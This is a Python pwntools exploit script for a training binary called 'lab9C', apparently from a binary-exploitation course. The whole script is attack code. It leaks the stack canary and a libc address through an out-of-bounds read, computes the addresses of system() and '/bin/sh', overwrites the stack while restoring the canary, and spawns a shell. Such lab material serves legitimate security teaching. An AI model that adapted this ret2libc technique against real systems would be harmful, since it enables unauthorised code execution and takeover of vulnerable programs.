#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386',kernel='amd64')
context.terminal = ['tmux','splitw','-h']
context.log_level = "DEBUG"
exe = './lab9C'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode child
break *main+236
break *main+267
break *_ZN8DSVectorIiE6appendEi+121
break *main+392
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
io.recv()

#Leak stack cookie 
io.sendline("2")
io.recv()
io.sendline("257")
cookie = io.recvline()
cookie = cookie.decode().split("=")[1].strip()
print("Leaked Cookie..")
print(cookie)
#cookie = p32(int(cookie),signed=True)
#print(hexdump(cookie))
#gdb.attach(io,gdbscript=gdbscript)
#io.interactive()

#Leak value from libc to find offset
io.sendline("2")
io.recv()
io.sendline("8")
libc_val = io.recvline()
libc_val = libc_val.decode().split("=")[1].strip()
system = str(int(libc_val)+240444)
binsh = str(int(system)+1310922)

#Overwrite stack
payload = cyclic(300*4)
#3838527
for i in range(0,256):
    io.sendline("1")
    io.recv()
    #io.sendline("1")
    data = int(binascii.hexlify(payload[(i*4):((i+1)*4)]),16)
    io.sendline(str(data))
    io.recv()

#Overwrite stack cookie
io.sendline("1")
io.recv()
io.sendline(cookie)

#Overwrite stack
for i in range(0,3):
    io.sendline("1")
    io.recv()
    #io.sendline("1")
    data = int(binascii.hexlify(payload[(i*4):((i+1)*4)]),16)
    io.sendline(str(data))
    io.recv()


io.sendline("1")
io.recv()
io.sendline(system)
io.recv()

io.sendline("1")
io.recv()
io.sendline(system)
io.recv()

io.sendline("1")
io.recv()
io.sendline(binsh)
io.recv()

io.sendline("3")
io.recv()

#print(f"System: {system}")
#print(f"Binsh: {binsh}")
#gdb.attach(io,gdbscript=gdbscript)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#print(hexdump(cookie))
io.interactive()

